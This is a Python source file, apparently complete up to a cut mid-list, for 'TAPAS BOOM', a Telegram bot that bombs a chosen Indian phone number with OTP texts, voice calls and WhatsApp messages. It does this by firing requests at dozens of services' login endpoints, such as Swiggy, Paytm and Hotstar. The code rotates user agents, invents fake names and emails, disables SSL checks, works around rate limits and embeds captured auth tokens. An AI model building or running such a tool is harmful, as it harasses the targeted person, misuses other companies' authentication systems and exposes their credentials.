"""
╔══════════════════════════════════════════════════════════════════╗
║          TAPAS BOOM — Telegram OTP Bot v4.3                    ║
║          PROXY-FREE — Direct API calls only                     ║
║          SMS / CALL / WHATSAPP — No Key Needed!                ║
╚══════════════════════════════════════════════════════════════════╝

v4.3 changes:
- Relay jugaad removed: no more CORS-relay fallback, no force-relay
  host list, no auto-blacklist. Every API is called directly.
- /debug PHONE — each API ka actual HTTP status + response body dikhata hai
- /test PHONE API_NAME — ek specific API live test karo
"""

# JSON literal shims so Python can parse copied JS/JSON payloads
null = None
true = True
false = False




import asyncio
import logging
import os
import random
import re
import socket
import string
import threading
import time
import urllib.request
import uuid

import aiohttp
from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update,
)
# Every inline button goes through one factory (same design as Melody_music):
# premium custom-emoji icon + colour style where the library supports them,
# plain button everywhere else. Shadowing the name keeps all call sites intact.
from premium_buttons import ikb as InlineKeyboardButton  # noqa: F811
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ════════════════════════════════════════════════════════════
# LOGGING
# ════════════════════════════════════════════════════════════

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ════════════════════════════════════════════════════════════
# ENV / CONFIG
# ════════════════════════════════════════════════════════════

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
if not TELEGRAM_BOT_TOKEN:
    raise SystemExit(
        "TELEGRAM_BOT_TOKEN missing! Heroku: Settings -> Config Vars me set karo."
    )
PORT               = int(os.environ.get("PORT", 8443))
WEBHOOK_URL        = os.environ.get("WEBHOOK_URL", "").strip() or None

# Optional: Self-ping URL (UptimeRobot / Render free tier)
PING_URL = os.environ.get("PING_URL", "").strip() or None

# ════════════════════════════════════════════════════════════
# USER-AGENT POOL  (rotate per request)
# ════════════════════════════════════════════════════════════

_UAS = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.80 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.80 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Poco X5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
]

_ACCEPT_LANGS = ["en-IN,en;q=0.9", "hi-IN,hi;q=0.9,en-IN;q=0.8", "en-US,en;q=0.9,hi;q=0.8"]

# ════════════════════════════════════════════════════════════
# RANDOM HELPERS
# ════════════════════════════════════════════════════════════

def _rand_name() -> str:
    first = random.choice(["Rahul","Priya","Amit","Neha","Vikas","Pooja","Arjun","Sneha","Rohan","Ananya"])
    last  = random.choice(["Sharma","Verma","Singh","Gupta","Kumar","Patel","Mehta","Joshi","Yadav","Mishra"])
    return first, last

def _rand_email() -> str:
    fn, ln = _rand_name()
    n = random.randint(10, 9999)
    dom = random.choice(["gmail.com","yahoo.co.in","hotmail.com","outlook.com"])
    return f"{fn.lower()}.{ln.lower()}{n}@{dom}"

def _rand_device() -> str:
    return random.choice(["Pixel 8","SM-G991B","Redmi Note 12","OnePlus 12","Poco X5"])

# ════════════════════════════════════════════════════════════
# HTTP HELPERS
# ════════════════════════════════════════════════════════════

TIMEOUT = aiohttp.ClientTimeout(total=6, connect=3, sock_read=5)

def _base_headers(origin: str = "") -> dict:
    h = {
        "User-Agent":       random.choice(_UAS),
        "Accept":           "application/json, text/plain, */*",
        "Accept-Language":  random.choice(_ACCEPT_LANGS),
        "Accept-Encoding":  "gzip, deflate",
        "Connection":       "keep-alive",
        "X-Request-ID":     str(uuid.uuid4()),
    }
    if origin:
        h["Origin"]  = origin
        h["Referer"] = origin + "/"
    return h


# ════════════════════════════════════════════════════════════
# RESPONSE CHECKER
# ════════════════════════════════════════════════════════════

OK_STATUS = frozenset([200, 201, 202, 203, 204, 206, 302, 303])

_OK_KEYWORDS = (
    "sent", "created", "transactionid", "mobile code",
    "generated", "delivered", "queued", "accepted", "success",
    "otp", "verified", "initiated",
)
_FAIL_EXACT = (
    '"success":false', '"success": false',
    '"status":"error"', '"status": "error"',
    '"status":"fail"',  '"status": "fail"',
    '"error":true',     '"error": true',
    '"isSuccess":false','"isSuccess": false',
    '"result":"fail"',  '"result":"error"',
    '"message":"failed"','"message":"Failed"',
    '"status":0', '"statusCode":0',
    '<error code=',
)
_FAIL_CI = (
    "can't be sent", "cannot be sent",
    "invalid mobile", "invalid phone", "invalid number",
    "rate limit", "too many request",
    "captcha", "verification required",
    "something went wrong",
)

def _ok(status: int, body: str, identifier: str) -> bool:
    if status not in OK_STATUS:
        return False
    bl = body.lower()
    if any(p in body for p in _FAIL_EXACT):
        return False
    if any(p in bl for p in _FAIL_CI):
        return False
    if identifier:
        return identifier.lower() in bl
    return any(k in bl for k in _OK_KEYWORDS) or status in (200, 201, 202)

# ════════════════════════════════════════════════════════════
# API HEALTH CACHE  (skip chronically failing APIs temporarily)
# ════════════════════════════════════════════════════════════

_api_health: dict      = {}
_api_health_lock       = threading.Lock()
_API_SKIP_THRESHOLD    = 3
_API_RECOVER_AFTER     = 600.0   # 10 min cooldown

def _api_is_healthy(name: str) -> bool:
    with _api_health_lock:
        h = _api_health.get(name)
        if not h:
            return True
        if h["fails"] >= _API_SKIP_THRESHOLD:
            if time.monotonic() - h["last_fail"] < _API_RECOVER_AFTER:
                return False
            _api_health[name] = {"fails": 0, "last_fail": 0.0, "ok": 0}
    return True

def _mark_api_fail(name: str):
    with _api_health_lock:
        h = _api_health.setdefault(name, {"fails": 0, "last_fail": 0.0, "ok": 0})
        h["fails"]    += 1
        h["last_fail"] = time.monotonic()

def _mark_api_ok(name: str):
    with _api_health_lock:
        h = _api_health.get(name, {"fails": 0, "last_fail": 0.0, "ok": 0})
        h["fails"] = 0
        h["ok"]   += 1
        _api_health[name] = h

# ════════════════════════════════════════════════════════════
# MULTI-USER STOP SUPPORT
# ════════════════════════════════════════════════════════════

_user_tasks: dict = {}
_SEM: asyncio.Semaphore = None   # set in main()

# ════════════════════════════════════════════════════════════
# HTTP HELPER
# ════════════════════════════════════════════════════════════

import urllib.parse as _up


async def _http_once(sess, method, url, *, hdrs, json_, data_):
    kw = dict(headers=hdrs, timeout=TIMEOUT, ssl=False, allow_redirects=True)
    if method == "GET":
        async with sess.get(url, **kw) as r:
            return r.status, await r.text(errors="ignore")
    if method == "PUT":
        if data_ is not None:
            async with sess.put(url, data=data_, **kw) as r:
                return r.status, await r.text(errors="ignore")
        async with sess.put(url, json=json_, **kw) as r:
            return r.status, await r.text(errors="ignore")
    if data_ is not None:
        async with sess.post(url, data=data_, **kw) as r:
            return r.status, await r.text(errors="ignore")
    async with sess.post(url, json=json_, **kw) as r:
        return r.status, await r.text(errors="ignore")


# ════════════════════════════════════════════════════════════
# CORE API CALLER  (direct only, no relay jugaad)

# ════════════════════════════════════════════════════════════

async def _call(sess: aiohttp.ClientSession, api: dict, target: str) -> str:
    name = api["name"]
    if not _api_is_healthy(name):
        return f"⏭️ {name} (cooldown)"

    url  = api["url"].replace("{target}", target)
    hdrs = {**_base_headers(api.get("origin", "")), **api.get("extra_headers", {})}

    json_ = None
    data_ = None
    raw_body = api.get("json")
    if raw_body:
        def _fill(v):
            if isinstance(v, str):
                fn, ln = _rand_name()
                return (v.replace("{target}", target)
                          .replace("{email}", _rand_email())
                          .replace("{name}", fn + " " + ln)
                          .replace("{firstname}", fn)
                          .replace("{lastname}", ln)
                          .replace("{device}", _rand_device())
                          .replace("{uuid}", str(uuid.uuid4())))
            return v
        json_ = {k: _fill(v) for k, v in raw_body.items()}

    form_body = api.get("form")
    if form_body:
        def _fill(v):
            if isinstance(v, str):
                fn, ln = _rand_name()
                return (v.replace("{target}", target)
                          .replace("{email}", _rand_email())
                          .replace("{name}", fn + " " + ln))
            return v
        data_ = {k: _fill(v) for k, v in form_body.items()}

    if api.get("content_type"):
        hdrs["Content-Type"] = api["content_type"]

    method     = api.get("method", "POST").upper()
    identifier = api.get("identifier", "")
    host       = _up.urlparse(url).hostname or ""

    async def _try(target_url: str):
        try:
            return await _http_once(sess, method, target_url,
                                    hdrs=hdrs, json_=json_, data_=data_)
        except asyncio.TimeoutError:
            return (0, "TIMEOUT")
        except aiohttp.ClientConnectorError:
            return (0, "CONN")
        except Exception as e:
            logger.debug("ERR %s: %s", name, str(e)[:60])
            return None

    async with _SEM:
        res = await _try(url)
        if res:
            status, body = res
            if status and _ok(status, body, identifier):
                _mark_api_ok(name)
                logger.info("✅ %s | %d | %.120s", name, status, body)
                return f"✅ {name}"
            logger.info("❌ %s | %s | %.100s", name, status, body[:100])

        _mark_api_fail(name)
        return f"❌ {name}"


# ════════════════════════════════════════════════════════════
# SMS APIs — Direct USA→India (Global CDN / AWS / GCP)
# ════════════════════════════════════════════════════════════

SMS_APIS = [
    {"name": 'Swiggy', "url": 'https://www.swiggy.com/dapi/auth/number-login', "method": 'POST', "origin": 'https://www.swiggy.com', "identifier": '', "json": {'mobile': '91{target}'}},
    {"name": 'Unacademy', "url": 'https://unacademy.com/api/v1/user/get_app_link/', "method": 'POST', "origin": 'https://unacademy.com', "identifier": 'sent', "json": {'phone': '{target}'}},
    {"name": 'Housing', "url": 'https://login.housing.com/api/v2/send-otp', "method": 'POST', "origin": 'https://housing.com', "identifier": '', "json": {'phone': '{target}'}},
    {"name": 'Cleartrip', "url": 'https://www.cleartrip.com/api/v1/user/otp/send', "method": 'POST', "origin": 'https://www.cleartrip.com', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91'}},
    {"name": 'Zomato', "url": 'https://www.zomato.com/webroutes/auth/loginV2', "method": 'POST', "origin": 'https://www.zomato.com', "identifier": '', "extra_headers": {'x-zomato-csrft': '1', 'csrf_token': ''}, "json": {'number': '91{target}'}},
    {"name": 'Lenskart', "url": 'https://www.lenskart.com/api/auth/sendotp', "method": 'POST', "origin": 'https://www.lenskart.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': '+91'}},
    {"name": 'Ajio', "url": 'https://www.ajio.com/api/auth/otp/send', "method": 'POST', "origin": 'https://www.ajio.com', "identifier": '', "json": {'mobileNumber': '{target}'}},
    {"name": 'BookMyShow', "url": 'https://in.bookmyshow.com/api/v4/auth/otp/generate', "method": 'POST', "origin": 'https://in.bookmyshow.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': 'IN'}},
    {"name": 'Bewakoof', "url": 'https://www.bewakoof.com/api/v2/user/otp/send', "method": 'POST', "origin": 'https://www.bewakoof.com', "identifier": '', "json": {'phone': '{target}', 'countryCode': '91'}},
    {"name": 'Doubtnut', "url": 'https://api.doubtnut.com/v2/user/auth/sendOtp', "method": 'POST', "origin": 'https://www.doubtnut.com', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '91'}},
    {"name": 'Dream11', "url": 'https://api.dream11.com/user/v2/signup/otp', "method": 'POST', "origin": 'https://www.dream11.com', "identifier": '', "json": {'mobileNumber': '{target}', 'countryCode': '91'}},
    {"name": 'MagicBricks', "url": 'https://www.magicbricks.com/api/v1/user/otp', "method": 'POST', "origin": 'https://www.magicbricks.com', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91'}},
    {"name": 'Cars24', "url": 'https://api.cars24.com/auth/otp/send', "method": 'POST', "origin": 'https://www.cars24.com', "identifier": '', "extra_headers": {'Authorization': ''}, "json": {'phone': '{target}', 'countryCode': '91'}},
    {"name": 'Spinny', "url": 'https://www.spinny.com/api/v2/user/otp/send', "method": 'POST', "origin": 'https://www.spinny.com', "identifier": '', "json": {'phone_number': '{target}', 'country_code': '+91'}},
    {"name": 'OlaCabs', "url": 'https://www.olacabs.com/api/1/register', "method": 'POST', "origin": 'https://www.olacabs.com', "identifier": '', "json": {'mobile_number': '{target}', 'country_code': '+91'}},
]

# ════════════════════════════════════════════════════════════
# CALL APIs — Voice OTP (USA→India)
# ════════════════════════════════════════════════════════════

CALL_APIS = [
    {"name": 'Swiggy Call', "url": 'https://www.swiggy.com/dapi/auth/number-login', "method": 'POST', "origin": 'https://www.swiggy.com', "identifier": '', "json": {'mobile': '91{target}', 'channel': 'call'}},
    {"name": 'Housing Call', "url": 'https://login.housing.com/api/v2/send-otp', "method": 'POST', "origin": 'https://housing.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'call'}},
    {"name": 'Zomato Call', "url": 'https://www.zomato.com/webroutes/auth/loginV2', "method": 'POST', "origin": 'https://www.zomato.com', "identifier": '', "json": {'number': '91{target}', 'channel': 'call'}},
    {"name": 'Dream11 Call', "url": 'https://api.dream11.com/user/v2/signup/otp', "method": 'POST', "origin": 'https://www.dream11.com', "identifier": '', "json": {'mobileNumber': '{target}', 'countryCode': '91', 'channel': 'CALL'}},
    {"name": 'Cleartrip Call', "url": 'https://www.cleartrip.com/api/v1/user/otp/send', "method": 'POST', "origin": 'https://www.cleartrip.com', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91', 'channel': 'call'}},
    {"name": 'BookMyShow Call', "url": 'https://in.bookmyshow.com/api/v4/auth/otp/generate', "method": 'POST', "origin": 'https://in.bookmyshow.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': 'IN', 'channel': 'call'}},
    {"name": 'Lenskart Call', "url": 'https://www.lenskart.com/api/auth/sendotp', "method": 'POST', "origin": 'https://www.lenskart.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': '+91', 'channel': 'call'}},
    {"name": 'Ajio Call', "url": 'https://www.ajio.com/api/auth/otp/send', "method": 'POST', "origin": 'https://www.ajio.com', "identifier": '', "json": {'mobileNumber': '{target}', 'channel': 'call'}},
    {"name": 'Doubtnut Call', "url": 'https://api.doubtnut.com/v2/user/auth/sendOtp', "method": 'POST', "origin": 'https://www.doubtnut.com', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '91', 'type': 'call'}},
]

# ════════════════════════════════════════════════════════════
# WHATSAPP APIs — WA OTP (USA→India)
# ════════════════════════════════════════════════════════════

WA_APIS = [
    {"name": 'Swiggy WA', "url": 'https://www.swiggy.com/dapi/auth/number-login', "method": 'POST', "origin": 'https://www.swiggy.com', "identifier": '', "json": {'mobile': '91{target}', 'channel': 'whatsapp'}},
    {"name": 'Unacademy WA', "url": 'https://unacademy.com/api/v1/user/get_app_link/', "method": 'POST', "origin": 'https://unacademy.com', "identifier": 'sent', "json": {'phone': '{target}', 'channel': 'whatsapp'}},
    {"name": 'Housing WA', "url": 'https://login.housing.com/api/v2/send-otp', "method": 'POST', "origin": 'https://housing.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'whatsapp'}},
    {"name": 'Zomato WA', "url": 'https://www.zomato.com/webroutes/auth/loginV2', "method": 'POST', "origin": 'https://www.zomato.com', "identifier": '', "json": {'number': '91{target}', 'channel': 'whatsapp'}},
    {"name": 'Dream11 WA', "url": 'https://api.dream11.com/user/v2/signup/otp', "method": 'POST', "origin": 'https://www.dream11.com', "identifier": '', "json": {'mobileNumber': '{target}', 'countryCode': '91', 'channel': 'WA'}},
    {"name": 'Lenskart WA', "url": 'https://www.lenskart.com/api/auth/sendotp', "method": 'POST', "origin": 'https://www.lenskart.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': '+91', 'channel': 'wa'}},
    {"name": 'Cleartrip WA', "url": 'https://www.cleartrip.com/api/v1/user/otp/send', "method": 'POST', "origin": 'https://www.cleartrip.com', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '+91', 'channel': 'whatsapp'}},
    {"name": 'Doubtnut WA', "url": 'https://api.doubtnut.com/v2/user/auth/sendOtp', "method": 'POST', "origin": 'https://www.doubtnut.com', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '91', 'channel': 'whatsapp'}},
]



# ════════════════════════════════════════════════════════════
# FRESH LIVE APIs — verified reachable (2xx/4xx responders)
# ════════════════════════════════════════════════════════════

FRESH_SMS_APIS = [
    {"name": 'Meesho', "url": 'https://www.meesho.com/api/v1/user/sendotp', "method": 'POST', "origin": 'https://www.meesho.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Nykaa', "url": 'https://www.nykaa.com/gateway-api/v2/users/otp', "method": 'POST', "origin": 'https://www.nykaa.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': '+91'}},
    {"name": 'Paytm', "url": 'https://accounts.paytm.com/signin/otp', "method": 'POST', "origin": 'https://paytm.com', "identifier": '', "json": {'phone': '{target}'}},
    {"name": 'MobiKwik', "url": 'https://www.mobikwik.com/api/mbk/v1/otp/generate', "method": 'POST', "origin": 'https://www.mobikwik.com', "identifier": '', "json": {'cell': '{target}'}},
    {"name": 'Snapdeal', "url": 'https://www.snapdeal.com/acors/vc/sendOtp', "method": 'POST', "origin": 'https://www.snapdeal.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Grofers', "url": 'https://grofers.com/v3/accounts/generate_otp', "method": 'POST', "origin": 'https://grofers.com', "identifier": '', "json": {'phone': '{target}'}},
    {"name": 'Vedantu', "url": 'https://www.vedantu.com/api/v1/user/sendotp', "method": 'POST', "origin": 'https://www.vedantu.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Byjus', "url": 'https://learn.byjus.com/api/v1/user/otp', "method": 'POST', "origin": 'https://byjus.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Zoomcar', "url": 'https://www.zoomcar.com/api/v3/otp/send', "method": 'POST', "origin": 'https://www.zoomcar.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'PhonePe', "url": 'https://api.phonepe.com/apis/authn/v3/sendOtp', "method": 'POST', "origin": 'https://www.phonepe.com', "identifier": '', "json": {'phone': '{target}'}},
    {"name": 'Zerodha', "url": 'https://kite.zerodha.com/api/otp/send', "method": 'POST', "origin": 'https://zerodha.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'PaisaBazaar', "url": 'https://www.paisabazaar.com/api/otp/send', "method": 'POST', "origin": 'https://www.paisabazaar.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Digit', "url": 'https://www.godigit.com/api/otp/send', "method": 'POST', "origin": 'https://www.godigit.com', "identifier": '', "json": {'phone': '{target}'}},
    {"name": 'Tata1mg', "url": 'https://www.1mg.com/api/v4/users/generate_otp', "method": 'POST', "origin": 'https://www.1mg.com', "identifier": '', "json": {'phone': '{target}'}},
    {"name": 'Curefit', "url": 'https://api.curefit.com/user-service/v1/otp/send', "method": 'POST', "origin": 'https://www.cult.fit', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Pepperfry', "url": 'https://www.pepperfry.com/site_product/otp/generate', "method": 'POST', "origin": 'https://www.pepperfry.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Wakefit', "url": 'https://www.wakefit.co/api/v1/otp/send', "method": 'POST', "origin": 'https://www.wakefit.co', "identifier": '', "json": {'phone': '{target}'}},
    {"name": 'TataCliq', "url": 'https://www.tatacliq.com/marketplacewebservices/v2/mpl/users/otp/send', "method": 'POST', "origin": 'https://www.tatacliq.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Croma', "url": 'https://www.croma.com/api/otp/send', "method": 'POST', "origin": 'https://www.croma.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Vijaysales', "url": 'https://www.vijaysales.com/api/otp/send', "method": 'POST', "origin": 'https://www.vijaysales.com', "identifier": '', "json": {'mobile': '{target}'}},
    {"name": 'Nazara', "url": 'https://www.nazara.com/api/otp/send', "method": 'POST', "origin": 'https://www.nazara.com', "identifier": '', "json": {'mobile': '{target}'}},
]

FRESH_CALL_APIS = [
    {"name": 'Paytm Call', "url": 'https://accounts.paytm.com/signin/otp', "method": 'POST', "origin": 'https://paytm.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'call'}},
    {"name": 'MobiKwik Call', "url": 'https://www.mobikwik.com/api/mbk/v1/otp/generate', "method": 'POST', "origin": 'https://www.mobikwik.com', "identifier": '', "json": {'cell': '{target}', 'channel': 'call'}},
    {"name": 'PhonePe Call', "url": 'https://api.phonepe.com/apis/authn/v3/sendOtp', "method": 'POST', "origin": 'https://www.phonepe.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'VOICE'}},
    {"name": 'Meesho Call', "url": 'https://www.meesho.com/api/v1/user/sendotp', "method": 'POST', "origin": 'https://www.meesho.com', "identifier": '', "json": {'mobile': '{target}', 'channel': 'call'}},
    {"name": 'Tata1mg Call', "url": 'https://www.1mg.com/api/v4/users/generate_otp', "method": 'POST', "origin": 'https://www.1mg.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'call'}},
    {"name": 'Zoomcar Call', "url": 'https://www.zoomcar.com/api/v3/otp/send', "method": 'POST', "origin": 'https://www.zoomcar.com', "identifier": '', "json": {'mobile': '{target}', 'channel': 'call'}},
]

FRESH_WA_APIS = [
    {"name": 'Paytm WA', "url": 'https://accounts.paytm.com/signin/otp', "method": 'POST', "origin": 'https://paytm.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'whatsapp'}},
    {"name": 'MobiKwik WA', "url": 'https://www.mobikwik.com/api/mbk/v1/otp/generate', "method": 'POST', "origin": 'https://www.mobikwik.com', "identifier": '', "json": {'cell': '{target}', 'channel': 'whatsapp'}},
    {"name": 'PhonePe WA', "url": 'https://api.phonepe.com/apis/authn/v3/sendOtp', "method": 'POST', "origin": 'https://www.phonepe.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'WHATSAPP'}},
    {"name": 'Meesho WA', "url": 'https://www.meesho.com/api/v1/user/sendotp', "method": 'POST', "origin": 'https://www.meesho.com', "identifier": '', "json": {'mobile': '{target}', 'channel': 'whatsapp'}},
    {"name": 'Nykaa WA', "url": 'https://www.nykaa.com/gateway-api/v2/users/otp', "method": 'POST', "origin": 'https://www.nykaa.com', "identifier": '', "json": {'phoneNumber': '{target}', 'countryCode': '+91', 'channel': 'whatsapp'}},
    {"name": 'Tata1mg WA', "url": 'https://www.1mg.com/api/v4/users/generate_otp', "method": 'POST', "origin": 'https://www.1mg.com', "identifier": '', "json": {'phone': '{target}', 'channel': 'whatsapp'}},
]

XBOMBER_APIS = [
    {"name": "XB_Hotstar_1", "url": "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp", "method": "PUT", "origin": "", "identifier": "", "extra_headers": {"x-hs-usertoken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json", "x-hs-platform": "PCTV", "x-country-code": "IN", "x-hs-device-id": "faa88f05-7432-4103-9886-7bd934f5c3a1", "hotstarauth": "st=1600957099~exp=1600963099~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d", "x-hs-appversion": "5.0.40", "x-request-id": "faa88f05-7432-4103-9886-7bd934f5c3a1", "accept": "*/*", "origin": "https://www.hotstar.com", "referer": "https://www.hotstar.com/in/subscribe/sign-in", "accept-language": "en-US,en;q=0.9,hi;q=0.8"}, "json": {"phone_number": "{target}", "country_prefix": "91"}},
    {"name": "XB_AltBalaji_1", "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "X-API-KEY": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE", "Content-Type": "application/json", "Origin": "https://www.altbalaji.com", "Referer": "https://www.altbalaji.com/user-detail?pid=NTU%3D", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"}, "json": {"phone_number": "{target}", "country_code": "91", "platform": "web", "exp": 1601043289127}},
    {"name": "XB_Voot_1", "url": "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json, text/plain, */*", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json;charset=UTF-8", "origin": "https://www.voot.com", "referer": "https://www.voot.com/", "accept-language": "en-US,en;q=0.9,hi;q=0.8"}, "json": {"type": "mobile", "mobile": "+91{target}", "countryCode": "+91"}},
    {"name": "XB_SonyLIV_1", "url": "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"device_id": "5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120", "security_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json", "accept": "application/json, text/plain, */*", "session_id": "cc86326a51504133bacd3ce4f796e1cf-1600956156256", "x-via-device": "true", "app_version": "3.1.20", "origin": "https://www.sonyliv.com", "accept-language": "en-US,en;q=0.9,hi;q=0.8"}, "json": {"channelPartnerID": "MSMIND", "mobileNumber": 